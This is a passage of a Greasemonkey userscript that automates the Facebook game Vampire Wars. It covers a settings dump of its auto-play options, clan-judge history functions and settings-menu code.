        'Player exp to next level: <strong>' + ExpToNextLevel + '</strong><br>' +
        'Player clan size: <strong>' + GM_getValue('myClan') + '</strong><br>' +
        'Player energy: <strong>' + energy + '</strong><br>' +
        'Player max energy: <strong>' + maxenergy + '</strong><br>' +
        'Player rage: <strong>' + rage + '</strong><br>' +
        'Player maxrage: <strong>' + maxrage + '</strong><br>' +
        'Player blood: <strong>' + blood + '</strong><br>' +
        'Player health: <strong>' + health + '</strong><br>' +
        'Player SR: <strong>' + GM_getValue('mySkillRanking') + '</strong><br>' +
        'Player Arena SR: <strong>' + GM_getValue('mySkillRankingArena') + '</strong><br>' +
        '-------------------Coffin Tab-------------------<br>' +
        'Enable auto-refresh: <strong>' + showIfUnchecked(GM_getValue('autoClick'))+ '</strong><br>' +
        '&nbsp;&nbsp;-Refresh rate low: <strong>'+ GM_getValue('r1') + '</strong><br>' +
        '&nbsp;&nbsp;-Refresh rate high: <strong>' + GM_getValue('r2') + '</strong><br>' +
        '&nbsp;&nbsp;-Refresh page: <strong>' + GM_getValue('refreshPage') + '</strong><br>' +
        'Auto accept clan invites: <strong>' + showIfUnchecked(GM_getValue('autoClan'))+ '</strong><br>' +
        'Prioritize Missions over Combat: <strong>' + showIfUnchecked(GM_getValue('missionPriority'))+ '</strong><br>' +
        'Enable auto-Bank: <strong>' + showIfUnchecked(GM_getValue('autoBank'))+ '</strong><br>' +
        '&nbsp;&nbsp;-Bank above: <strong>' + GM_getValue('bankConfig') + '</strong><br>' +
        '&nbsp;&nbsp;-Keep: <strong>' + GM_getValue('bankKeep') + '</strong><br>' +
        'Auto-Judge: <strong>' + showIfUnchecked(GM_getValue('autoJudge'))+ '</strong><br>' +
        '&nbsp;&nbsp;-Count: <strong>' + GM_getValue('JudgeCount') + '</strong><br>' +
        '&nbsp;&nbsp;-Rating: <strong>' + ratings[parseInt(GM_getValue('JudgeRating'))] + '</strong><br>' +
        '&nbsp;&nbsp;-Comment: <strong>' + GM_getValue('JudgeComment') + '</strong><br>' +
        'Periodic Auto-Judging: <strong>' + showIfUnchecked(GM_getValue('autoPeriodicJudge'))+ '</strong><br>' +
        '&nbsp;&nbsp;-Delay: <strong>' + GM_getValue('autoJudgeTimerIndexMax') + '</strong><br>' +
        '&nbsp;&nbsp;-# Judgements: <strong>' + GM_getValue('autoJudgeCount') + '</strong><br>' +
        'Use boosts:<br>' +
        '&nbsp;&nbsp;-Use Rage Boosts: <strong>' + showIfUnchecked(GM_getValue('autoBoostRage')) + '</strong><br>' +
        '&nbsp;&nbsp;-Use Rage Boost @ Rage: <strong>' + GM_getValue('autoBoostRageMin') + '</strong><br>' +
        '&nbsp;&nbsp;-# of Rage Boosts to Keep: <strong>' + GM_getValue('autoBoostRageKeep') + '</strong><br>' +
        '&nbsp;&nbsp;-Use 50% Energy Boosts: <strong>' + showIfUnchecked(GM_getValue('autoBoostFiftyNrg')) + '</strong><br>' +
        '&nbsp;&nbsp;-Use 50% EnergyBoost @ Energy: <strong>' + GM_getValue('autoBoostFiftyNrgMin') + '</strong><br>' +
        '&nbsp;&nbsp;-# of 50% Energy Boosts to Keep: <strong>' + GM_getValue('autoBoostFiftyNrgKeep') + '</strong><br>' +
        '&nbsp;&nbsp;-Use 100% Energy Boosts: <strong>' + showIfUnchecked(GM_getValue('autoBoostHundredNrg')) + '</strong><br>' +
        '&nbsp;&nbsp;-Use 100% EnergyBoost @ Energy: <strong>' + GM_getValue('autoBoostHundredNrgMin') + '</strong><br>' +
        '&nbsp;&nbsp;-# of 100% Energy Boosts to Keep: <strong>' + GM_getValue('autoBoostHundredNrgKeep') + '</strong><br>' +
        '&nbsp;&nbsp;-Waste % Allowed at level: <strong>' + GM_getValue('autoBoostWaste') + '</strong><br>' +
        '&nbsp;&nbsp;-Too Many Energy Boosts to gain more?: <strong>' + GM_getValue('tooManyNRGBoosts') + '</strong><br>' +
        '&nbsp;&nbsp;-Use Health Boosts: <strong>' + showIfUnchecked(GM_getValue('autoBoostHealth')) + '</strong><br>' +
        '&nbsp;&nbsp;-Use Health Boost @ Health: <strong>' + GM_getValue('autoBoostHealthMin') + '</strong><br>' +
        '&nbsp;&nbsp;-# of Health Boosts to Keep: <strong>' + GM_getValue('autoBoostHealthKeep') + '</strong><br>' +
        '&nbsp;&nbsp;-Min Blood Magic to use Rage Boost: <strong>' + ratings[parseInt(GM_getValue('autoBoostRageMinGG'))] + '</strong><br>' +
        '&nbsp;&nbsp;-Min Blood Magic to use Energy Boost: <strong>' + ratings[parseInt(GM_getValue('autoBoostNRGMinGW'))] + '</strong><br>' +
/*
        'Enable auto-Stats: <strong>' + showIfUnchecked(GM_getValue('autoStats'))+ '</strong><br>' +
        '&nbsp;&nbsp;-Attack: <strong>' + GM_getValue('curAttack') + '</strong><br>' +
        '&nbsp;&nbsp;-Defense: <strong>' + GM_getValue('defenceStat') + '</strong><br>' +
        '&nbsp;&nbsp;-Energy: <strong>' + GM_getValue('maxEnergy') + '</strong><br>' +
        '&nbsp;&nbsp;-Health: <strong>' + GM_getValue('maxHealth') + '</strong><br>' +
        '&nbsp;&nbsp;-Rage: <strong>' + GM_getValue('maxRage') + '</strong><br>' +
*/
        'Enable auto-Stats: <strong>' + showIfUnchecked(GM_getValue('autoStats')) + '</strong><br>' +
        'Disable auto-stat: <strong>' + showIfUnchecked(GM_getValue('autoStatDisable')) + '</strong><br>' +
        '&nbsp;&nbsp;-Energy Base: <strong>' + GM_getValue('autoStatEnergyBase') + '</strong><br>' +
        '&nbsp;&nbsp;-Rage Base: <strong>' + GM_getValue('autoStatRageBase') + '</strong><br>' +
        '&nbsp;&nbsp;-Attack Base: <strong>' + GM_getValue('autoStatAttackBase') + '</strong><br>' +
        '&nbsp;&nbsp;-Defense Base: <strong>' + GM_getValue('autoStatDefenseBase') + '</strong><br>' +
        '&nbsp;&nbsp;-Health Base: <strong>' + GM_getValue('autoStatHealthBase') + '</strong><br>' +
        '&nbsp;&nbsp;-Energy Ratio: <strong>' + GM_getValue('autoStatEnergyRatio') + '</strong><br>' +
        '&nbsp;&nbsp;-Rage Ratio: <strong>' + GM_getValue('autoStatRageRatio') + '</strong><br>' +
        '&nbsp;&nbsp;-Attack Ratio: <strong>' + GM_getValue('autoStatAttackRatio') + '</strong><br>' +
        '&nbsp;&nbsp;-Defense Ratio: <strong>' + GM_getValue('autoStatDefenseRatio') + '</strong><br>' +
        '&nbsp;&nbsp;-Health Ratio: <strong>' + GM_getValue('autoStatHealthRatio') + '</strong><br>' +
        '&nbsp;&nbsp;-Energy Mode: <strong>' + GM_getValue('autoStatEnergyMode') + '</strong><br>' +
        '&nbsp;&nbsp;-Rage Mode: <strong>' + GM_getValue('autoStatRageMode') + '</strong><br>' +
        '&nbsp;&nbsp;-Attack Mode: <strong>' + GM_getValue('autoStatAttackMode') + '</strong><br>' +
        '&nbsp;&nbsp;-Defense Mode: <strong>' + GM_getValue('autoStatDefenseMode') + '</strong><br>' +
        '&nbsp;&nbsp;-Health Mode: <strong>' + GM_getValue('autoStatHealthMode') + '</strong><br>' +
        '&nbsp;&nbsp;-Energy Prio: <strong>' + GM_getValue('autoStatEnergyPrio') + '</strong><br>' +
        '&nbsp;&nbsp;-Rage Prio: <strong>' + GM_getValue('autoStatRagePrio') + '</strong><br>' +
        '&nbsp;&nbsp;-Attack Prio: <strong>' + GM_getValue('autoStatAttackPrio') + '</strong><br>' +
        '&nbsp;&nbsp;-Defense Prio: <strong>' + GM_getValue('autoStatDefensePrio') + '</strong><br>' +
        '&nbsp;&nbsp;-Health Prio: <strong>' + GM_getValue('autoStatHealthPrio') + '</strong><br>' +
        '&nbsp;&nbsp;-Energy Fallback: <strong>' + GM_getValue('autoStatEnergyFallback') + '</strong><br>' +
        '&nbsp;&nbsp;-Rage Fallback: <strong>' + GM_getValue('autoStatRageFallback') + '</strong><br>' +
        '&nbsp;&nbsp;-Attack Fallback: <strong>' + GM_getValue('autoStatAttackFallback') + '</strong><br>' +
        '&nbsp;&nbsp;-Defense Fallback: <strong>' + GM_getValue('autoStatDefenseFallback') + '</strong><br>' +
        '&nbsp;&nbsp;-Health Fallback: <strong>' + GM_getValue('autoStatHealthFallback') + '</strong><br>' +
        '&nbsp;&nbsp;-Rest AutoStat: <strong>' + GM_getValue('restAutoStat') + '</strong><br>' +
        '&nbsp;&nbsp;-Next Stat: <strong>' + GM_getValue('nextStat') + '</strong><br>' +
        '-------------------Clan Tab---------------------<br>' +
        'Favored Clan List: <strong>' + GM_getValue('clanList') + '</strong><br>' +
        'Judge Favored Clan once/day: <strong>' + showIfUnchecked(GM_getValue('clanJudgeFC')) + '</strong><br>' +
        '&nbsp;&nbsp;-Rating: <strong>' + ratings[parseInt(GM_getValue('clanJudgeRating'))] + '</strong><br>' +
        '&nbsp;&nbsp;-Leave Comment: <strong>' + showIfUnchecked(GM_getValue('clanJudgeCommentOn')) + '</strong><br>' +
        '&nbsp;&nbsp;-Comment: <strong>' + GM_getValue('clanJudgeComment') + '</strong><br>' +
        'Clan Judge Limit:<br>' +
        '&nbsp;&nbsp;-Limit from T1-T2: <strong>' + GM_getValue('clanJudgeLimitTimeT1toT2') + '</strong><br>' +
        '&nbsp;&nbsp;-T1: <strong>' + GM_getValue('clanJudgeLimitTimeT1Time') + '</strong><br>' +
        '&nbsp;&nbsp;-T2: <strong>' + GM_getValue('clanJudgeLimitTimeT2Time') + '</strong><br>' +
/*      '&nbsp;&nbsp;-Limit from T3-T4: <strong>' + GM_getValue('clanJudgeLimitTimeT3toT4') + '</strong><br>' +
        '&nbsp;&nbsp;-T3: <strong>' + GM_getValue('clanJudgeLimitTimeT3Time') + '</strong><br>' +
        '&nbsp;&nbsp;-T4: <strong>' + GM_getValue('clanJudgeLimitTimeT4Time') + '</strong><br>' +
*/
	'-------------------Missions Tab-----------------<br>' +
        'Enable auto-Mission: <strong>' + showIfUnchecked(GM_getValue('autoMission')) + '</strong><br>' +
        '&nbsp;&nbsp;-Mission selected: <strong>' + missions[parseInt(GM_getValue('selectMission'))][0] + '</strong><br>' +
        '&nbsp;&nbsp;-Mission Gain: <strong>' + GM_getValue('missionExpGain') + '</strong><br>' +
        '&nbsp;&nbsp;-Exp to Reserve: <strong>' + GM_getValue('missionExpReserve') + '</strong><br>' +
        '&nbsp;&nbsp;-Force mission Mastery: <strong>' + showIfUnchecked(GM_getValue('missionMastery')) + '</strong><br>' +
        '&nbsp;&nbsp;-Show Exp-to-Energy Ratio: <strong>' + showIfUnchecked(GM_getValue('showExpNrgRatio')) + '</strong><br>' +
        'Enable automatic Ancient Chest selection: <strong>' + showIfUnchecked(GM_getValue('autoPublishAncientChests')) + '</strong><br>' +
        '&nbsp;&nbsp;-Priority 1: <strong>' + autoChestDescrips[parseInt(GM_getValue('autoChestPrio1'))] + '</strong><br>' +
        '&nbsp;&nbsp;-Priority 2: <strong>' + autoChestDescrips[parseInt(GM_getValue('autoChestPrio2'))] + '</strong><br>' +
        '&nbsp;&nbsp;-Priority 3: <strong>' + autoChestDescrips[parseInt(GM_getValue('autoChestPrio3'))] + '</strong><br>' +
        '&nbsp;&nbsp;-Priority 4: <strong>' + autoChestDescrips[parseInt(GM_getValue('autoChestPrio4'))] + '</strong><br>' +
        '&nbsp;&nbsp;-Priority 5: <strong>' + autoChestDescrips[parseInt(GM_getValue('autoChestPrio5'))] + '</strong><br>' +
        '&nbsp;&nbsp;-Priority 6: <strong>' + autoChestDescrips[parseInt(GM_getValue('autoChestPrio6'))] + '</strong><br>' +
        '&nbsp;&nbsp;-Priority 7: <strong>' + autoChestDescrips[parseInt(GM_getValue('autoChestPrio7'))] + '</strong><br>' +
        '&nbsp;&nbsp;-Priority 8: <strong>' + autoChestDescrips[parseInt(GM_getValue('autoChestPrio8'))] + '</strong><br>' +
        'Skip instead of Publish Ancient Chests: <strong>' + showIfUnchecked(GM_getValue('autoPublishAncientChestsSkip')) + '</strong><br>' +
        'Only select chests when my energy is empty: <strong>' + showIfUnchecked(GM_getValue('autoPublishAncientChestsWait')) + '</strong><br>' +
        '-------------------Combat Tab-------------------<br>' +
        'Enable auto-Fight: <strong>' + showIfUnchecked(GM_getValue('autoFight')) + '</strong><br>' +
        '&nbsp;&nbsp;-Fight above Rage: <strong>' + GM_getValue('fightKeepRage') + '</strong><br>' +
        '&nbsp;&nbsp;-Fight Exp Gain: <strong>' + GM_getValue('fightExpGain') + '</strong><br>' +
        'Enable auto-heal: <strong>' + showIfUnchecked(GM_getValue('autoHeal')) + '</strong><br>' +
        '&nbsp;&nbsp;-Heal below health: <strong>' + GM_getValue('healthLevel') + '</strong><br>' +
        '&nbsp;&nbsp;-Heal above Rage: <strong>' + GM_getValue('healthRage') + '</strong><br>' +
        'Avoid Vamps I have lost to: <strong>' + showIfUnchecked(GM_getValue('autoFightAvoidLost')) + '</strong><br>' +
        '&nbsp;&nbsp;-Keep list of last # Losses: <strong>' + GM_getValue('autoFightLossListSize') + '</strong><br>' +
        'Show Lost Fights Log: <strong>' + showIfUnchecked(GM_getValue('showLostLog')) + '</strong><br>' +
        'Show Good Targets List: <strong>' + showIfUnchecked(GM_getValue('showGoodTargets')) + '</strong><br>' +
        '&nbsp;&nbsp;-Keep list of last # Good Targets: <strong>' + GM_getValue('autoGoodTargetListSize') + '</strong><br>' +
        '&nbsp;&nbsp;-Good Targets Min Level: <strong>' + GM_getValue('goodTargetsMinLevel') + '</strong><br>' +
        '&nbsp;&nbsp;-Good Targets Max Level: <strong>' + GM_getValue('goodTargetsMaxLevel') + '</strong><br>' +
        '&nbsp;&nbsp;-Good Targets Min SR: <strong>' + GM_getValue('goodTargetsMinSR') + '</strong><br>' +
        '&nbsp;&nbsp;-Good Targets Max SR: <strong>' + GM_getValue('goodTargetsMaxSR') + '</strong><br>' +
        'Fight random vampires: <strong>' + showIfSelected(GM_getValue('fightRandom')) + '</strong><br>' +
        '&nbsp;&nbsp;-Min Level: <strong>' + GM_getValue('fightMinLevel') + '</strong><br>' +
        '&nbsp;&nbsp;-Max Level: <strong>' + GM_getValue('fightLevel') + '</strong><br>' +
        '&nbsp;&nbsp;-Fight Level Relative: <strong>' + showIfSelected(GM_getValue('fightLevelRelative')) + '</strong><br>' +
        '&nbsp;&nbsp;-Min Clan: <strong>' + GM_getValue('fightMinClanSize') + '</strong><br>' +
        '&nbsp;&nbsp;-Max Clan: <strong>' + GM_getValue('fightClanSize') + '</strong><br>' +
        '&nbsp;&nbsp;-Min SR: <strong>' + GM_getValue('fightClanRating') + '</strong><br>' +
        '&nbsp;&nbsp;-Max SR: <strong>' + GM_getValue('fightClanMaxRating') + '</strong><br>' +
        '&nbsp;&nbsp;-SR Relative: <strong>' + showIfSelected(GM_getValue('fightRatingRelative')) + '</strong><br>' +
        '&nbsp;&nbsp;-Limit Repeated Attacks on same Vamp: <strong>' + showIfSelected(GM_getValue('autoFightAttackLimit')) + '</strong><br>' +
        '&nbsp;&nbsp;&nbsp;&nbsp;-Max # Attacks: <strong>' + GM_getValue('autoFightAttackLimitMax') + '</strong><br>' +
        '&nbsp;&nbsp;&nbsp;&nbsp;-Keep # of last attacks: <strong>' + GM_getValue('autoFightAttackLimitListSize') + '</strong><br>' +
        'Fight specific vampires: <strong>' + showIfSelected(GM_getValue('rFightList')) + '</strong><br>' +
        '&nbsp;&nbsp;-Opponent List: <strong>' + GM_getValue('fightList') + '</strong><br>' +
        'Fight in Arena: <strong>' + showIfSelected(GM_getValue('fightArena')) + '</strong><br>' +
        '&nbsp;&nbsp;-Arena Min Level: <strong>' + GM_getValue('fightArenaMinLevel') + '</strong><br>' +
        '&nbsp;&nbsp;-Arena Max Level: <strong>' + GM_getValue('fightArenaLevel') + '</strong><br>' +
        '&nbsp;&nbsp;-Arena Fight Level Relative: <strong>' + showIfSelected(GM_getValue('fightArenaLevelRelative')) + '</strong><br>' +
        '&nbsp;&nbsp;-Arena Min Clan: <strong>' + GM_getValue('fightArenaMinClanSize') + '</strong><br>' +
        '&nbsp;&nbsp;-Arena Max Clan: <strong>' + GM_getValue('fightArenaClanSize') + '</strong><br>' +
        '&nbsp;&nbsp;-Arena Min SR: <strong>' + GM_getValue('fightArenaRating') + '</strong><br>' +
        '&nbsp;&nbsp;-Arena Max SR: <strong>' + GM_getValue('fightArenaMaxRating') + '</strong><br>' +
        '&nbsp;&nbsp;-Arena SR Relative: <strong>' + showIfSelected(GM_getValue('fightArenaRatingRelative')) + '</strong><br>' +
        '-------------------Bazaar Tab-------------------<br>' +
        'Enable auto-Gifting: <strong>' + showIfUnchecked(GM_getValue('autoGifting')) + '</strong><br>' +
        '&nbsp;&nbsp;-Skill to Gift: <strong>' + attributes[parseInt(GM_getValue('selectAttribute'))][0] + '</strong><br>' +
        '&nbsp;&nbsp;-Gift Count: <strong>' + GM_getValue('giftingCount') + '</strong><br>' +
        '&nbsp;&nbsp;-Gift to ID: <strong>' + GM_getValue('giftingUser') + '</strong><br>' +
        'Align screen left: <strong>' + showIfUnchecked(GM_getValue('leftAlign')) + '</strong><br>' +
        'Show Statistics Box: <strong>' + showIfUnchecked(GM_getValue('showStatsBox')) + '</strong><br>' +
        'Enable auto minion purchase: <strong>' + showIfUnchecked(GM_getValue('autoMinion')) + '</strong><br>' +
        '&nbsp;&nbsp;-Next minion cost: <strong>' + GM_getValue('minionCostk', 0)*1000 + '</strong><br>' +
        '&nbsp;&nbsp;-Enable spending from bank: <strong>' + showIfUnchecked(GM_getValue('spendBank')) + '</strong><br>' +
        '&nbsp;&nbsp;-Keep in bank: <strong>' + GM_getValue('spendBankKeep') + '</strong><br>' +
        'Enable auto ability upgrading: <strong>' + showIfUnchecked(GM_getValue('autoAbility')) + '</strong><br>' +
        'Enable logging: <strong>' + showIfUnchecked(GM_getValue('autoLog')) + '</strong><br>' +
        '&nbsp;&nbsp;-Logging length: <strong>' + GM_getValue('autoLogLength') + '</strong><br>' +
        '&nbsp;&nbsp;-Log Heal Events: <strong>' + showIfUnchecked(GM_getValue('logHealEvents')) + '</strong><br>' +
        '&nbsp;&nbsp;-Log Attack Events: <strong>' + showIfUnchecked(GM_getValue('logAttackEvents')) + '</strong><br>' +
        '&nbsp;&nbsp;-Log Fight Results: <strong>' + showIfUnchecked(GM_getValue('logFightResults')) + '</strong><br>' +
        '&nbsp;&nbsp;-Log Mission Execution: <strong>' + showIfUnchecked(GM_getValue('logMissionExecution')) + '</strong><br>' +
        '&nbsp;&nbsp;-Log Blood Magic: <strong>' + showIfUnchecked(GM_getValue('logBloodMagic')) + '</strong><br>' +
        '&nbsp;&nbsp;-Log Minion Purchases: <strong>' + showIfUnchecked(GM_getValue('logMinionPurch')) + '</strong><br>' +
        'Auto-Publish:<br>' +
        '&nbsp;&nbsp;-Blood Magic: <strong>' + GM_getValue('autoPublishBloodMagic') + '</strong><br>' +
        '&nbsp;&nbsp;-Mission Assistance: <strong>' + GM_getValue('autoPublishMissionAssistance') + '</strong><br>' +
        '&nbsp;&nbsp;-Kills: <strong>' + GM_getValue('autoPublishFightKill') + '</strong><br>' +
        '&nbsp;&nbsp;-Promo Minions: <strong>' + GM_getValue('autoPublishPromoMinion') + '</strong><br>' +
        '&nbsp;&nbsp;-Level Up: <strong>' + GM_getValue('autoPublishLevelUp') + '</strong><br>' +
        '&nbsp;&nbsp;-Collector Mystery Box: <strong>' + GM_getValue('autoPublishCollectorBox') + '</strong><br>' +
        'Publish Limits:<br>' +
        '&nbsp;&nbsp;-Limit from T1-T2: <strong>' + GM_getValue('autoPublishLimitTimeT1toT2') + '</strong><br>' +
        '&nbsp;&nbsp;-T1: <strong>' + GM_getValue('autoPublishLimitTimeT1Time') + '</strong><br>' +
        '&nbsp;&nbsp;-T2: <strong>' + GM_getValue('autoPublishLimitTimeT2Time') + '</strong><br>' +
        '&nbsp;&nbsp;-Limit from T3-T4: <strong>' + GM_getValue('autoPublishLimitTimeT3toT4') + '</strong><br>' +
        '&nbsp;&nbsp;-T3: <strong>' + GM_getValue('autoPublishLimitTimeT3Time') + '</strong><br>' +
        '&nbsp;&nbsp;-T4: <strong>' + GM_getValue('autoPublishLimitTimeT4Time') + '</strong><br>' +
        '&nbsp;&nbsp;-Randomly Publish: <strong>' + GM_getValue('autoPublishLimitRandom') + '</strong><br>' +
        '&nbsp;&nbsp;-Random Publish Percent: <strong>' + GM_getValue('autoPublishLimitRandomPercent') + '</strong><br>' +
        '-------------------Elders Tab-------------------<br>' +
        'Enable auto Akem\'s Gamble: <strong>' + showIfUnchecked(GM_getValue('autoGamble')) + '</strong><br>' +
        '&nbsp;&nbsp;-Selected Box: <strong>' + BoxToOpenText + '</strong><br>' +
        '&nbsp;&nbsp;-Next Free Gamble: <strong>' + new Date(1000 *GM_getValue('LotteryDue',0)).format("h:MM:ss TT") + '</strong><br>' +
        'Collect Blood Magic: <strong>' + showIfUnchecked(GM_getValue('autoBloodMagic'))+ '</strong><br>' +
        'Automatically use Collector: <strong>' + showIfUnchecked(GM_getValue('autoCollector'))+ '</strong><br>' +
        '&nbsp;&nbsp;-Collector Item selected: <strong>' + collectorItems[parseInt(GM_getValue('selectCollector'))][0] + '</strong><br>' +
        '&nbsp;&nbsp;-Action when "Too Late": <strong>' + CollectorActionTooLate + '</strong><br>' +
        '&nbsp;&nbsp;-Disable Collection due to too many Energy Boosts: <strong>' + showIfUnchecked(GM_getValue('autoCollectorPause')) + '</strong><br>' +
        '&nbsp;&nbsp;-Collector State: <strong>' + GM_getValue('collectorState') + '</strong><br>' +
        '&nbsp;&nbsp;-Collector Due: <strong>' + new Date(1000 *GM_getValue('CollectorDue',0)).format("h:MM:ss TT") + '</strong><br>' +
        'Visit Crypt every 24 hours: <strong>' + showIfUnchecked(GM_getValue('autoCrypt'))+ '</strong><br>' +
        'Automatically collect Elder\'s Retreat Properties <strong>' + showIfUnchecked(GM_getValue('autoRetreat'))+ '</strong><br>' +
        '&nbsp;&nbsp;-Elder\'s Retreat Ancient\'s Workshop due to collect: <strong>' + new Date(1000 *GM_getValue('Retreat1Due',0)).format("h:MM:ss TT") + '</strong><br>' +
        '&nbsp;&nbsp;-Elder\'s Retreat Sagaan\'s Altar due to collect: <strong>' + new Date(1000 *GM_getValue('Retreat2Due',0)).format("h:MM:ss TT") + '</strong><br>' +
        '-------------------Event Tab--------------------<br>' +
        'Event: <strong>' + eventName + '</strong><br>' +
        '&nbsp;&nbsp;-Event Activated: <strong>' + eventActive + '</strong><br>' +
        '&nbsp;&nbsp;-Enable Event auto-Mission: <strong>' + showIfUnchecked(GM_getValue('autoEventMission')) + '</strong><br>' +
        '&nbsp;&nbsp;-Master Stages in Order: <strong>' + showIfSelected(GM_getValue('eventMasterAll')) + '</strong><br>' +
        '&nbsp;&nbsp;-Mission selected (in order): <strong>' + eventMissions[parseInt(GM_getValue('selectEventMissionA'))][0] + '</strong><br>' +
        '&nbsp;&nbsp;-Master One Stage Only: <strong>' + showIfSelected(GM_getValue('eventMasterOne')) + '</strong><br>' +
        '&nbsp;&nbsp;-Tab selected (one stage): <strong>' + eventMissionTabs[parseInt(GM_getValue('selectEventMissionO'))][0] + '</strong><br>' +
        '&nbsp;&nbsp;-Reset Event Stage when completed: <strong>' + showIfUnchecked(GM_getValue('autoEventReset')) + '</strong><br>' +
        '&nbsp;&nbsp;-Repeat One Event Mission Endlessly: <strong>' + showIfUnchecked(GM_getValue('eventMissionRepeat')) + '</strong><br>' +
        '-------------------Misc-------------------------<br>' +
        'Visit Index Timer: <strong>' + GM_getValue('goToIndexTimer') + '</strong><br>' +
        'Visit Blood Magic Timer: <strong>' + GM_getValue('activeMagicTimer') + '</strong><br>' +
        'Visit Stats Timer: <strong>' + GM_getValue('goToStatsTimer') + '</strong><br>' +
        'Visit Bookmark URL Timer: <strong>' + GM_getValue('goToBookmarkURLInterval') + '</strong><br>' +
        'Visit Crypt Timer: <strong>' + GM_getValue('goToCryptURLInterval') + '</strong><br>' +
        'Blood Magic Free Spin Timer: <strong>' + new Date(1000 *GM_getValue('spin',0)).format("h:MM:ss TT") + '</strong><br>' +
        '-------------------Advanced Config--------------<br>' +
        'Advanced Config Active: <strong>' + advConfigActive + '</strong><br>' +
        'Main Delay: <strong>' + GM_getValue('advConfigDelay') + '</strong><br>' +
        'Timer Intervals:<br>' +
        'Active Magic Check: <strong>' + GM_getValue('activeMagicRefreshInterval') + '</strong><br>' +
        'Index Check: <strong>' + GM_getValue('goToIndexInterval') + '</strong><br>' +
        'Stats Check: <strong>' + GM_getValue('goToStatsInterval') + '</strong><br>' +
        'VW Bookmark URL Interval: <strong>' + GM_getValue('goToBookmarkURLInterval') + '</strong><br>' +
        'Event - Activate Override: <strong>' + showIfUnchecked(GM_getValue('eventActiveOverride')) + '</strong><br>' +





//        'Hide Daily List: <strong>'+ showIfUnchecked(GM_getValue('hideActionBox')) + '</strong><br>' +
//        'Hide Limited Time Offers: <strong>'+ showIfUnchecked(GM_getValue('hideOffer')) + '</strong><br>' +
//        'Hide gifts: <strong>'+ showIfUnchecked(GM_getValue('hideGifts')) + '</strong><br>' +
//        'Hide Friend Ladder: <strong>'+ showIfUnchecked(GM_getValue('hideFriendLadder')) + '</strong><br>' +
//        'Summarize attacks from Player Updates: <strong>' + showIfUnchecked(GM_getValue('hideAttacks')) + '</strong><br>' +
//        'Show pulse on the fight page: <strong>' + showIfUnchecked(GM_getValue('showPulse')) + '</strong><br>' +
//        'Show level on the hitlist page: <strong>' + showIfUnchecked(GM_getValue('showLevel')) + '</strong><br>' +
//        'Set window title to name on Facebook account: <strong>' + showIfUnchecked(GM_getValue('fbwindowtitle')) + '</strong><br>' +

//        '-------------------Energy Tab--------------------<br>' +
        '>  >  >  >  >  END SETTINGS DUMP  <  <  <  <  <');

	document.getElementById('debugDumpNotification').style.visibility = "visible";

}


function dumpClanJudgedList() {
	var dumpJudgeHistoryText = '->->->->- Begin Clan Judge History ->->->->-<br>';
	dumpJudgeHistoryText += '# Judge Entries:'+(GM_getValue('clanJudgedList').split(',').length-1)/3+'<br>';
//	dumpJudgeHistoryText += 'Raw data in Judged List:'+GM_getValue('clanJudgedList')+'<br>';
	var clanJudgedListArray = GM_getValue('clanJudgedList').split(',');
	if (GM_getValue('clanJudgedList').split(',').length-1 > 0) {
		for (var index = 1 ; index < clanJudgedListArray.length; index=index+3) {
//			dumpJudgeHistoryText += 'Judged <a href="http://apps.facebook.com/vampiresgame/stats.php?user='+clanJudgedListArray[index]+'">'+clanJudgedListArray[index]+'</a> @ '+ new Date(clanJudgedListArray[index+1]*1000).format("HH:MM:ss")+' on '+ new Date(clanJudgedListArray[index+1]*1000).format("yyyy-mm-dd")+', Comment @ '+ new Date(clanJudgedListArray[index+2]*1000).format("HH:MM:ss")+' on '+ new Date(clanJudgedListArray[index+2]*1000).format("yyyy-mm-dd")+'<br>';
			dumpJudgeHistoryText += 'Judged <a href="http://apps.facebook.com/vampiresgame/stats.php?user='+clanJudgedListArray[index]+'">'+clanJudgedListArray[index]+'</a> @ '+ new Date(clanJudgedListArray[index+1]*1000).format("HH:MM:ss")+' on '+ new Date(clanJudgedListArray[index+1]*1000).format("yyyy-mm-dd")+'<br>';
		}
	}
	dumpJudgeHistoryText += '->->->->- End Clan Judge History ->->->->-';
	addToLog(dumpJudgeHistoryText);
}


function clearClanJudgedList() {
	GM_setValue('clanJudgedList', '');
	document.getElementById('judgeListClearedNotification').style.visibility = "visible";
}


function clanJudgeCommentToggle() {
	var clanJudgeCommentTextbox = document.getElementById('clanJudgeComment');
	if (document.getElementById('clanJudgeCommentOn').checked) {
		clanJudgeCommentTextbox.disabled = false;
		clanJudgeCommentTextbox.style.background = "white";
		clanJudgeCommentTextbox.style.color = "#AA0000";
	} else {
		clanJudgeCommentTextbox.disabled = true;
		clanJudgeCommentTextbox.style.background = "#DDDDDD";
		clanJudgeCommentTextbox.style.color = "#C48189";
	}
}




///////////////////////////////////////////////////////////////////////////////
//   End of page code.                    Automatic play is kicked off by doAutoPlay().    //
///////////////////////////////////////////////////////////////////////////////

function giftPlayer(mobid){
	return function ()	{ window.location = "http://apps.facebook.com/"+SCRIPT.name+"/gift.php?user_id="+mobid;	}
}

function statsPlayer(mobid){
	return function ()	{ window.location = "http://apps.facebook.com/"+SCRIPT.name+"/comments.php?user="+mobid;}
}

function fbProfilePlayer(mobid){
	return function ()	{ window.location = "http://www.facebook.com/profile.php?id="+mobid;}
}

function toggleSettings(){
	var settingsBox = document.getElementById('settingsBox');
	if(!settingsBox)
		settingsBox = createMenu();

	if(settingsOpen == false){
        settingsOpen = true;
        settingsButton.innerHTML = "close settings";
        settingsBox.style.visibility = "visible";
		coffinMenuSelect();
	}
    else{
        settingsOpen = false;
        settingsButton.innerHTML = "open settings";
        settingsBox.style.visibility = "hidden";
		document.getElementById('coffinTab').style.visibility = "hidden";
		document.getElementById('clanTab').style.visibility = "hidden";
		document.getElementById('missionTab').style.visibility = "hidden";
		document.getElementById('combatTab').style.visibility = "hidden";
		document.getElementById('bazaarTab').style.visibility = "hidden";
		document.getElementById('eldersTab').style.visibility = "hidden";
		document.getElementById('debugDumpNotification').style.visibility = "hidden";
// Automate Special Events
		if(eventActive)
			document.getElementById('eventTab').style.visibility = "hidden";
		document.getElementById('advConfigTab').style.visibility = "hidden";
    }
}

function createMenu() {
	var settingsBox = makeElement('div', document.body,{'id':'settingsBox'});
		settingsBox.setAttribute("style", "position: absolute; left: "+bannerLeft+"px; top: "+(bannerTop+28)+"px;  width: 748px; height: 500px; background: black url(http://facebook6.vampires.static.zynga.com/31993/css/ui/border_deco_fb.jpg); font-family: Verdana; font-size: 10pt; text-align: left; padding: 5px; border: 1px dotted; visibility: hidden; z-index: 100;");

	var versionBox = makeElement('div', settingsBox,{'style':'position: absolute; left:40px; color: #FFFFFF;'});
